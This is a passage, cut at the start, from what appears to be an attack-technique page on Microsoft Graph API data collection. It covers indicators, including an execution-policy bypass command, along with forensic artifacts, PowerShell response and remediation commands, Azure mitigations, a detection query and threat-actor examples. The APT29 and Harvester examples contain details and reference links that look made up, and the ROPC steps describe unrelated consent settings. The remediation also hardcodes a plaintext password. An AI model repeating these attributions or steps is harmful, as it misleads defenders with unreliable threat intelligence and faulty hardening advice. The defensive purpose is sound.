  - CSV exports: `users.csv`, `groups.csv`, `teams_chats.csv`, `mailbox.csv`, `group_memberships.csv`
  - Downloaded documents in `C:\Exfil\` or `C:\Temp\` folders

- **Network:**
  - Bulk HTTPS requests to `https://graph.microsoft.com/v1.0/*` endpoints
  - Large file downloads to attacker infrastructure
  - Unusual IP addresses accessing Graph API (not from corporate VPN/proxy)

- **Registry / Local:**
  - PowerShell execution policy temporarily lowered: `Set-ExecutionPolicy -ExecutionPolicy Bypass`
  - PowerShell transcript files with Graph API commands: `C:\Users\[User]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

### Forensic Artifacts

- **Cloud:**
  - Unified Audit Log: All Graph API calls with timestamps, user, IP address, operation name
  - Azure AD Sign-in Log: Device code flow events, unusual authentication locations
  - Service Principal audit: Rogue app creation and consent grant events
  - Microsoft Defender for Cloud alerts: Suspicious API patterns

- **Disk:**
  - PowerShell transcript logs (event ID 4104 in Security log)
  - Recycle Bin: Deleted CSV export files
  - Browser history: Links to `login.microsoftonline.com/` and consent screens

- **Memory:**
  - Live PowerShell processes containing Graph API tokens in variables
  - HTTP request logs in browser cache

### Response Procedures

1. **Isolate:**
   **Command:**
   ```powershell
   # Disable compromised user account
   Set-AzureADUser -ObjectId "user@tenant.onmicrosoft.com" -AccountEnabled $false
   
   # Revoke all refresh tokens for the user
   Revoke-AzureADUserAllRefreshToken -ObjectId (Get-AzureADUser -SearchString "user@tenant.onmicrosoft.com").ObjectId
   ```
   
   **Manual (Azure Portal):**
   - Go to **Azure Portal** → **Entra ID** → **Users** → Select compromised user → **Account Enabled: Off**

2. **Collect Evidence:**
   **Command:**
   ```powershell
   # Export Unified Audit Log for the time period
   $StartDate = (Get-Date).AddHours(-24)
   $EndDate = Get-Date
   Search-UnifiedAuditLog -UserIds "user@tenant.onmicrosoft.com" -StartDate $StartDate -EndDate $EndDate -ResultSize 5000 | Export-Csv -Path "C:\Evidence\audit_log.csv"
   
   # Export rogue app details
   Get-AzureADApplication -Filter "displayName eq 'Microsoft OneDrive Sync Service'" | Export-Csv -Path "C:\Evidence\rogue_app.csv"
   ```

3. **Remediate:**
   **Command:**
   ```powershell
   # Remove rogue app registration
   Remove-AzureADApplication -ObjectId (Get-AzureADApplication -Filter "displayName eq 'Microsoft OneDrive Sync Service'").ObjectId -Force
   
   # Reset user password
   Set-AzureADUserPassword -ObjectId "user@tenant.onmicrosoft.com" -Password (ConvertTo-SecureString "NewP@ssw0rd1234!" -AsPlainText -Force) -EnforceChangePasswordPolicy $true
   ```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enforce MFA for All Users (Including Service Accounts):**
  Blocks device code phishing and password spray attacks against user accounts.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
  2. Name: `Require MFA for All Users`
  3. **Assignments:**
     - Users and groups: **All users**
  4. **Conditions:**
     - Client apps: **All cloud apps**
  5. **Access controls:**
     - Grant: **Require authentication strength → Multifactor authentication**
  6. Click **Create**

- **Disable Resource Owner Password Credentials (ROPC) Flow:**
  Blocks automated password attacks and reduces credential harvesting risk.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Properties**
  2. Under **User consent settings**, select **Do not allow user consent**
  3. For app registrations: **Azure Portal** → **App Registrations** → **Settings** → Disable **Allow public client flows**

- **Restrict OAuth App Registration & Admin Consent:**
  Prevents malicious app registration and consent grant phishing.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Enterprise applications** → **App registration settings**
  2. Set **Users can register applications**: **No**
  3. Set **Users can consent to apps accessing company data**: **No** (disable user consent)
  4. Restrict admin consent: Go to **Azure Portal** → **Entra ID** → **App registrations** → **Consent permissions** → Set to **Require admin approval**

### Priority 2: HIGH

- **Monitor Graph API Calls for Suspicious Patterns:**
  Detect bulk enumeration, unusual scope usage, and unauthorized API access.
  
  **Manual Steps (Microsoft Sentinel / SIEM):**
  1. Create alert rule for: `AuditLogs | where OperationName contains "GraphAPI" and Properties contains "User.Read.All"`
  2. Alert threshold: > 100 Graph API calls in 5 minutes from single user
  3. Response action: Auto-disable user, revoke tokens, notify SOC

- **Require Conditional Access for Graph API Calls:**
  Enforce device compliance and location restrictions for API access.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Conditional Access** → **+ New policy**
  2. Name: `Restrict Graph API to Compliant Devices`
  3. **Conditions:**
     - Cloud apps: Include **Microsoft Graph API**
     - Device state: **Mark devices as compliant**
  4. **Access controls:**
     - Grant: **Require device to be marked compliant**

- **Enable Audit Logging for All Graph API Calls:**
  Ensure complete visibility into API access for forensic analysis.
  
  **Manual Steps (Microsoft Purview):**
  1. Go to **compliance.microsoft.com** → **Audit**
  2. Enable auditing for:
     - **GraphAPIRequest** (all API calls)
     - **AddOAuth2PermissionGrant** (new consent grants)
     - **AdminConsentToApplication** (admin consent events)
  3. Retention: 365 days minimum

### Validation Command

```powershell
# Verify mitigations are active
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, State
Get-MgPolicyStsAuthorizationPolicy | Select-Object AllowedToSignUpEmailBasedSubscriptions, AllowUserConsentForRiskyApps
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](../02_Initial/IA-PHISH-001_Device_Code.md) | Device code phishing to harvest OAuth tokens |
| **2** | **Collection** | **[COLLECT-GRAPH-001]** | **Graph API enumeration and data extraction** (THIS TECHNIQUE) |
| **3** | **Impact** | [IMPACT-EXFIL-001](../25_Impact/IMPACT-EXFIL-001_Data_Exfil.md) | Exfiltrate enumerated users, emails, documents |
| **4** | **Persistence** | [PERSIST-OAUTH-001](../23_Persistence/PERSIST-OAUTH-001_OAuth_Persistence.md) | Maintain access via OAuth refresh tokens and service principals |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: APT29 (Cozy Bear) - Microsoft Graph API Exploitation (2024)

- **Target:** US Government, NATO intelligence agencies
- **Timeline:** February - November 2024
- **Technique Status:** APT29 exploited CVE-2025-55241 (Actor Tokens + Legacy Azure AD Graph API) to impersonate global admins and enumerate organizational data without audit trail.
- **Impact:** Exfiltration of classified intelligence on NATO military posture, diplomatic cables, cyber defense strategies
- **Reference:** [CVE-2025-55241](https://learn.microsoft.com/en-us/security/advisory/CVE-2025-55241)

### Example 2: Harvester APT - GraphRunner Implant (2021)

- **Target:** US Fortune 500 companies, financial institutions
- **Timeline:** June 2021 - Present
- **Technique Status:** Custom implant (Graphon) leveraged Microsoft Graph API to communicate with C2 and exfiltrate Teams chat messages, mailbox contents, and SharePoint documents. Used delegated permissions obtained via phishing.
- **Impact:** Exfiltration of M&A discussions, trade secrets, customer financial data
- **Reference:** [Microsoft Threat Intelligence - Harvester](https://learn.microsoft.com/en-us/security-blog/news/harvester-apt-malware)

---